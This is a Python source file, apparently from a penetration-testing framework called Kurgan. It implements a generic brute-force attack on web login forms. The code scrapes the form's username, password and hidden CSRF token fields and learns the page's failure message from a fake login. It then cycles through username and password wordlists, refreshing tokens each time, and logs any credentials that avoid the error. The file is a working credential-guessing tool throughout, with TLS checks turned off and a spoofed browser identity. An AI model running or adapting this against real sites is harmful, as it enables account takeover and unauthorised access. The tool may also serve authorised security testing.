'''
Vortex - Artificial Intelligence
http://www.vortex-ai.com.br/

Generic brute force

Read HTML Page to get form inputs

Author: Glaudson Ocampos - <glaudson.ml@gmail.com>
'''
'''
TODO: 
+ Add support to Javascript Challengers;
+ Improve method to detect input fields;
+ Add support to Captcha;
+ Add NLTK resources;
'''
import requests
import sys, os
import re
import signal
import urllib
import random, string

import difflib
from bs4 import BeautifulSoup
from time import sleep
import xml.sax.saxutils as saxutils

current_dir = os.path.basename(os.getcwd())
if current_dir == "libs":
    sys.path.append('../')
if current_dir == "Kurgan-Framework":
    sys.path.append('./')
    
import config as cf

USER_AGENT="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
ACCEPT_LANGUAGE="pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3"
ACCEPT_ENCODING="gzip, deflate, br"


class BruteForceGeneric(object):
    urlBase = ''
    urlTarget = ''
    fields = {}
    commonNames = []
    appFramework = ''
    proxies = ''
    session = ''
    passwordField = ''
    usernameField = ''
    bodyRequest = ''
    errorMessage = []
    tokenFields = []
    accounts_discovered = []    

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': USER_AGENT, 'Accept': ACCEPT, 'Accept-Language': ACCEPT_LANGUAGE, 'Accept-Encoding': ACCEPT_ENCODING})
        self.session.headers.update({'DNT': 1, 'Upgrade-Insecure-Requests':1})
        #self.proxies = {'http':'192.168.25.223:8080'}
        
    
    def set_urlBase(self, val):
        self.urlBase = val
    def get_urlBase(self):
        return self.urlBase

    def set_accounts_discovered(self, val):
        self.accounts_discovered.append(val)
    def get_accounts_discovered(self):
        return self.accounts_discovered
    def zera_accounts_discovered(self):
        for i in self.accounts_discovered:
            self.accounts_discovered.remove(i)
                    
    def set_urlTarget(self, html_doc):
        soup = BeautifulSoup(html_doc, 'html.parser')
        form_input = soup.find_all("form")
        for f in form_input:
            pattern = "action=\"(.*?)\""
            match = re.search(pattern, str(f))
            if match:
                action = match.group(1).lstrip()
                pattern = "^/"
                match2 =  re.search(pattern,action)
                if match2:
                    base = self.urlBase.split('/')
                    index = len(base) 
                    for i in range(0,3):
                        if i != 3:
                            self.urlTarget += base[i] + "/"

                    self.urlTarget += action
                    break
                else:
                    
                    base = self.urlBase.split('/')
                    index = len(base) 
                    for i in range(0,index-1):
                        if i != index-1:
                            self.urlTarget += base[i] + "/"
        
                    self.urlTarget += action
                    break
            #not match action
            else:
                self.urlTarget = self.urlBase
                break
        #print(self.urlTarget)
        
        
    def get_urlTarget(self):
        return self.urlTarget

    def set_passwordField(self, val):
        self.passwordField = val
    def get_passwordField(self):
        return self.passwordField
    
    def set_usernameField(self, val):
        self.usernameField = val
    def get_usernameField(self):
        return self.usernameField
    
    def set_tokenField(self, val):
        self.tokenFields.append(val)
    def get_tokenField(self):
        return self.tokenFields
    
    def zera_tokens(self):
        for val in self.tokenFields:
            self.tokenFields.remove(val)

    def get_Session(self):
        return self.session;
    
    def set_Fields(self, val):
        self.fields.update(val)
    def get_Fields(self):
        return self.fields
    
    def set_bodyRequest(self, val):
        self.bodyRequest = val
    def get_bodyRequest(self):
        return self.bodyRequest
    
    def set_ErroMsgs(self, val):
        self.errorMessage.append(val)
    def get_ErrorMsgs(self):
        return self.errorMessage
    def zera_ErrorMsgs(self):
        for val in self.errorMessage:
            self.errorMessage.remove(val)
    
    def get_error_message(self):
        self.zera_ErrorMsgs()
        r = self.session.get(self.urlBase, verify=False, proxies=self.proxies, allow_redirects=False)
        
        html = r.content.decode()
        #html = r.content.decode('windows-1252').encode('utf-8')
        soup = BeautifulSoup(html, 'html.parser')
        
        [s.extract() for s in soup(['[document]', 'head', 'title'])]
        visible_text = soup.getText()
        page_form = ''
        
        for line in visible_text.splitlines():
            #page_form += line.lstrip() + "\n"
            pattern = "[a-zA-Z-0-9]+"
            match = re.search(pattern,line)
            if match:
                page_form += line.lstrip() + "\n"
                #print(line.lstrip())
                
        sleep(1)
        
        username = "K4r" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
        password = username
        
        self.get_allInput(html)
        
        print("Trying invalid creds [" + username + "/" + password + "]")
        creds = {self.usernameField:str(username), self.passwordField:str(password)}
        self.fields.update(creds)
        data = ''
        for key in self.fields:
            data += key + "=" + self.fields[key] + "&" 
    
        print("Sending data: " + data)
        self.session.headers.update({'Referer': self.urlBase, 'Content-Type': 'application/x-www-form-urlencoded'})
        r = self.session.post(self.urlTarget, data,  allow_redirects=True, proxies=self.proxies, verify=False)
        #print(r.content.decode())
        
        #html = r.content.decode('windows-1252').encode('utf-8')
        html = r.content.decode()
        soup = BeautifulSoup(html, 'html.parser')
        
        [s.extract() for s in soup(['[document]', 'head', 'title'])]
        visible_text = soup.getText()
        page_error = ''
        for line in visible_text.splitlines():
        #    page_error += line.lstrip() + "\n"
            pattern = "[a-zA-Z-0-9]+"
            match = re.search(pattern,line)
            if match:
                page_error += line.lstrip() + "\n"
        
        print("-----------------------------------------------------------------------------------")
        print(page_error)
        print("-----------------------------------------------------------------------------------")

        diff = difflib.ndiff(page_form, page_error)
        delta1 = ''.join(x[2:] for x in diff if x.startswith('+ '))
        
        delta2 = delta1.rstrip()
        delta = delta2.lstrip()
        self.errorMessage.append(delta)
        #print("delta: " + delta)
    
        
        
    def get_response(self, Url):
        r = self.session.get(Url, verify=False, proxies=self.proxies)
        return r    
    
    def get_allInput(self, html_doc):
        self.fields = {}
        soup = BeautifulSoup(html_doc, 'html.parser')
        form_input = soup.find_all("input")
        
        for i in form_input:
            pattern = "name=\"(.*?)\""
            match = re.search(pattern, str(i))
            if match:
                name = match.group(1).lstrip()
                pattern2 = "value=\"(.*?)\""
                match2 = re.search(pattern2, str(i))
                if match2:
                    value = urllib.parse.quote(match2.group(1).lstrip())
                    #value = match2.group(1).lstrip()
                else:
                    value = ""
                w1 = {name:value}
                self.fields.update(w1) 


    def get_credentials_fields(self, html_doc):
        #method 1 = get from html(using nltk)
        html = html_doc
        soup = BeautifulSoup(html, 'html.parser')
        '''
        [s.extract() for s in soup(['style', 'script', '[document]', 'head', 'title'])]
        visible_text = soup.getText()
        
        for line in visible_text.splitlines():
            pattern = "[a-zA-Z-0-9]+"
            match = re.search(pattern,line)
            if match:
                print(line.lstrip())
         '''   
        #method 2: get from input fields
        form_input = soup.find_all("input")
        password_fields = []
        for f in form_input:
            pattern = "type=\"password\""
            match = re.search(pattern, str(f))
            if match:
                pattern = "name=\"(.*?)\""    
                match2 = re.search(pattern, str(f))
                if match2:
                    #password_fields.append(match2.group(1).lstrip())
                    self.passwordField = match2.group(1).lstrip()
            
            pattern = "(type=\"text\")"
            match = re.search(pattern, str(f))
            if match:
                pattern = "name=\"(.*?)\""    
                match2 = re.search(pattern, str(f))
                if match2:
                    self.usernameField = match2.group(1).lstrip()

        '''
        if len(password_fields) == 1:    
            self.passwordField = password_fields[0]
        else:
            word_diff = {}
            for p in password_fields:
                pdiff = difflib.ndiff(p, self.usernameField)
                delta = ''.join(x[2:] for x in pdiff if x.startswith('+ '))
                #print(p + ":" + delta + " : "+ str(len(delta)))
                w2 = {p:len(delta)}
                word_diff.update(w2) 
            self.passwordField = min(word_diff, key=word_diff.get)
         '''   
    
    def get_tokens_fields(self, html_doc):
        self.zera_tokens()
        soup = BeautifulSoup(html_doc, 'html.parser')
        form_input = soup.find_all("input")
        token_fields = []
        for f in form_input:
            pattern = "type=\"hidden\""
            match = re.search(pattern, str(f))
            if match:
                pattern = "name=\"(.*?)\""    
                match2 = re.search(pattern, str(f))
                if match2:
                    self.tokenFields.append(match2.group(1).lstrip())
        
        
    
    def get_capture_token(self, text, mtoken):
        #Todo: make pattern automatically
        #<input type='hidden' name='user_token' value='b6a2c4eb64226f2042cf4a39d6ee853a' />
        token = ''
        pattern1 = ".name='" + mtoken + "'.value='(.*)'"
        match = re.search(pattern1, text)
        if match:
            pattern2 = ".value=\'(.*)+\'"
            match2 = re.search(pattern2, match.group(0).lstrip())
            if match2:
                token = match.group(1).lstrip()
                #msg = mtoken + ':' + token
                #print(msg)
        return token
        
    def run_attack(self):
        self.session.headers.update({'Referer': self.urlBase, 'Content-Type': 'application/x-www-form-urlencoded'})
        r = self.session.post(self.urlTarget, self.bodyRequest,  allow_redirects=True, proxies=self.proxies, verify=False)
        return r    

    def runBF(self, url):
        currDir = cf.KURGAN_HOME #TODO: get real path
        userfile = currDir + cf.BRUTEFORCE_LOGIN_FILE
        passfile = currDir + cf.BRUTEFORCE_PASSWORD_FILE
        
        #fi = open("/tmp/saida.txt", 'w')
        #mymsg = "userfile = " +  userfile + " | passfile = " + passfile + " !!!\n"
        #fi.write(mymsg)
             
        
        self.zera_accounts_discovered()
        self.set_urlBase(url)
        print("Getting target url form...")
        page = self.get_response(url)
        html = page.content.decode()
        self.set_urlTarget(html)
        target_url = self.get_urlTarget()
        
        
        print("-----------------------------------------------------------------------------------")
        print("Target Url:" + target_url)
        print("-----------------------------------------------------------------------------------")
    
        print("Getting Input Fields: ")
        print("-----------------------------------------------------------------------------------")
        self.get_allInput(html)
        fields = self.get_Fields()
        for key in fields:
            print(key + ":" + fields[key], flush=True)

    
    #print("Adding some values from javascript...")
    #new_fields = {"loginWindow$LoginButton.x":"40","loginWindow$LoginButton.y":"8"}
    #bf.set_Fields(new_fields)
    
    
     
        print("-----------------------------------------------------------------------------------")
        print("Dettecting Username and Password Fields...")
        print("-----------------------------------------------------------------------------------")
        self.get_credentials_fields(html)
        print("Username field: " + self.get_usernameField())
        print("Password field: " + self.get_passwordField())
        print("-----------------------------------------------------------------------------------")
        print("Detecting token fields...")
        print("-----------------------------------------------------------------------------------")
        self.get_tokens_fields(html)
        if self.tokenFields:
            for tok in self.tokenFields:
                print(tok)
        print("-----------------------------------------------------------------------------------")
        print("Getting Error Message..")
        
        print("-----------------------------------------------------------------------------------")
        trying = 0;
        self.get_error_message()
        emsg = self.get_ErrorMsgs() 
        for e in emsg:
            if len(e) == 0:
                max_tries_error_messages = 5
                trying = 1
                for trying in range(1, max_tries_error_messages+1):
                    print("It was not possible to get error message.. Trying again [" + str(trying) + "/" + str(max_tries_error_messages) +"]...", end='', flush=True)
                    print("\n")
                    sleep(trying)
                    self.get_error_message() 
                    emsg2=self.get_ErrorMsgs() 
                    for e2 in emsg2:
                        if len(e2) == 0:
                            continue
                        else:
                            break
                
            else:
                errormsg = e.rstrip()
                print("Pattern to Regex:")
                print("-----------------------------------------------------------------------------------")
                print("|" + errormsg + "| Size = " + str(len(errormsg)), end='', flush=True)
                print("\n")

        
        
        print("-----------------------------------------------------------------------------------")
    
        sleep(1)    
        print("Running Attack...")
        print("-----------------------------------------------------------------------------------")
        
        
        if userfile is not None and passfile is not None:
            try:
                uFile = open(userfile)
            except OSError as er:
                ferror_msg = []
                ferror_msg.append("Failed to open file: " + userfile)
                return ferror_msg
            
            pFile = open(passfile)
            
            stop = False
            for username in uFile.read().split('\n'):
                if stop is True:
                    break
                for password in pFile.read().split('\n'):
                    #update token:
                    page = self.get_response(url)
                    for tok in self.tokenFields:
                        token_name = tok
                        tokenval = self.get_capture_token(page.content.decode(), token_name)
                        token = {token_name:str(tokenval)}
                        self.set_Fields(token)
                    
                    creds = {self.get_usernameField():str(username), self.get_passwordField():str(password)}
                    self.set_Fields(creds)
                    fields = self.get_Fields()
                    data = ''
                    for key in fields:
                        data += key + "=" + fields[key] + "&" 
    
                        #print("data = " + data)
                    self.set_bodyRequest(data)
                    
                    r = self.run_attack()
                    for e in emsg:
                        error1 =  e.rstrip().replace("(","\(") #need replace and prepare regex.
                        error2 = error1.replace(")","\)")
                        error3 = error2.replace("'",".")
                        error4 = error3.replace("á",".")
                        pattern = error4
                        print("Trying with " + str(username) + ":" + str(password))
                    
                        text1 = saxutils.unescape(r.content.decode())
                        texto = text1.replace("&aacute;","á")
                        #texto = html.unescape()
                        match = re.search(pattern, texto)
                        if match:
                            continue
                        else:
                            #print(texto)
                            print("Possible account found: " + str(username) + "/" + str(password))
                            account = str(username) + "/" + str(password)
                            self.accounts_discovered.append(account)
                            stop = True
                            break
                pFile.seek(0)
        print("Attack Finished.")
        return self.accounts_discovered
    
